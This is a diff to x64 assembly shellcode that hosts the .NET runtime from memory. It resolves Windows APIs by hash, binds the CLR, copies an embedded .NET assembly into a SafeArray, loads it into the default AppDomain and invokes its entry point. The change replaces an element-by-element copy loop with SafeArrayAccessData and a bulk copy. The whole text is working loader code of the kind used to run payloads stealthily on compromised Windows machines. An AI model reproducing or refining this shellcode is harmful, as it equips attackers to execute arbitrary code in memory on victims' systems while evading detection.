@@ -19,36 +19,36 @@ shellcode:              ;int     3
                         call    get_api_mshash
                         mov     rbx, rax 
                         
-                        lea     rcx, [szmscoree]
+                        lea     rcx, szmscoree
                         call    rbx
-                        lea     rcx, [szoleaut32]
+                        lea     rcx, szoleaut32
                         call    rbx
                         
                         
                         mov     ecx, 0DA8DE904h
                         call    get_api_mshash          ;CorBindToRuntime
                         
-                        lea     rcx, [pCorRuntimeHost]
+                        lea     rcx, pCorRuntimeHost
                         mov     [rsp+20h], rcx
-                        lea     r9, [IID_CorRuntimeHost]
-                        lea     r8, [CLSID_CorRuntimeHost]           
+                        lea     r9, IID_CorRuntimeHost
+                        lea     r8, CLSID_CorRuntimeHost           
                         xor     edx, edx
-                        lea     rcx, [usnetver]
+                        lea     rcx, usnetver
                         call    rax
                         
-                        mov     rcx, [pCorRuntimeHost]
+                        mov     rcx, pCorRuntimeHost
                         mov     rax, [rcx]
                         call    qword ptr [rax+50h]             ;pCorRuntimeHost->Start();
                                                
-                        mov     rcx, [pCorRuntimeHost]
+                        mov     rcx, pCorRuntimeHost
                         mov     rax, [rcx]
-                        lea     rdx, [pDefaultDomain]
+                        lea     rdx, pDefaultDomain
                         call    qword ptr[rax+68h]              ;pCorRuntimeHost->GetDefaultDomain
                         
-                        mov     rcx, [pDefaultDomain]
+                        mov     rcx, pDefaultDomain
                         mov     rax, [rcx]
-                        lea     r8, [pAppDomain]
-                        lea     rdx, [IID_AppDomain]
+                        lea     r8, pAppDomain
+                        lea     rdx, IID_AppDomain
                         call    qword ptr[rax]
                         
                         
@@ -59,72 +59,70 @@ shellcode:              ;int     3
                         xor     edx, edx
                         mov     ecx,17                               ;VT_UI1
                         call    rax
-                        mov     [pRawAssembly], rax
+                        mov     pRawAssembly, rax
                         
-                        mov     ecx, 0827606BEh                      ;SafeArrayPutElement
+                        mov     ecx, 09F266B8Eh                      ;SafeArrayAccessData
                         call    get_api_mshash
-                        mov     rbx, rax
                         
-                        lea     rsi, [dotnetbytes]
-                        xor     ecx, ecx
-                        mov     [index], ecx
-                        mov     edi, dword ptr [dotnetbytes_size]
-                        lea     rdi, [rsi+rdi]
-
-__fill_array:           
+                        lea     rdx, pbytes
+                        mov     rcx, pRawAssembly
+                        call    rax
                         
-                        mov     r8, rsi
-                        lea     rdx, [index]
-                        mov     rcx, [pRawAssembly]
-                        call    rbx
-
-             
-                        inc     rsi
-                        inc     dword ptr[index]
-                        cmp     rsi, rdi
-                        jnz     __fill_array
+                        mov     rdi, pbytes
+                        lea     rsi, dotnetbytes
+                        mov     ecx, dotnetbytes_size
+                        cld
+                        rep     movsb
                         
-                        mov     rcx, [pAppDomain]
+                        mov     ecx, 0AB2BF222h                      ;SafeArrayUnaccessData
+                        call    get_api_mshash
+                        
+                        mov     rcx, pRawAssembly
+                        call    rax
+                        
+                        
+                        
+                        mov     rcx, pAppDomain
                         mov     rax, [rcx]
-                        lea     r8, [pAssembly]
-                        mov     rdx, [pRawAssembly]
+                        lea     r8, pAssembly
+                        mov     rdx, pRawAssembly
                         call    qword ptr[rax+168h]             ;pAppDomain->Load_3
                         
-                        mov     rcx, [pAssembly]
+                        mov     rcx, pAssembly
                         mov     rax, [rcx]
-                        lea     rdx, [pMethod]
+                        lea     rdx, pMethod
                         call    qword ptr[rax+80h]              ;pAssembly->get_EntryPoint
                                                 
                         xor     r9, r9
                         xor     r8, r8
-                        lea     rdx, [obj]
-                        mov     rcx, [pMethod]
+                        lea     rdx, obj
+                        mov     rcx, pMethod
                         mov     rax, [rcx]
                         call    qword ptr[rax+128h]              ;pMethidInfo->Invoke_3
                         
                         mov     ecx, 0E11676C3h
                         call    get_api_mshash
                         
-                        mov     rcx, [pRawAssembly]
+                        mov     rcx, pRawAssembly
                         call    rax
                         
-                        mov     rcx, [pMethod]
+                        mov     rcx, pMethod
                         mov     rax, [rcx]
                         call    qword ptr[rax+10h]
                         
-                        mov     rcx, [pAssembly]
+                        mov     rcx, pAssembly
                         mov     rax, [rcx]
                         call    qword ptr[rax+10h]
                         
-                        mov     rcx, [pAppDomain]
+                        mov     rcx, pAppDomain
                         mov     rax, [rcx]
                         call    qword ptr[rax+10h]
                         
-                        mov     rcx, [pDefaultDomain]
+                        mov     rcx, pDefaultDomain
                         mov     rax, [rcx]
                         call    qword ptr[rax+10h]
                         
-                        mov     rcx, [pCorRuntimeHost]
+                        mov     rcx, pCorRuntimeHost
                         mov     rax, [rcx]
                         call    qword ptr[rax+10h]
                         
@@ -220,6 +218,7 @@ obj                     dq      0       ;VARIANT for obj...
                         dq      0
 
 index                   dd      ?
+pbytes                  dq      ?
 
 CLSID_CorRuntimeHost    dd 0CB2F6723h           
                         dd 11D2AB3Ah
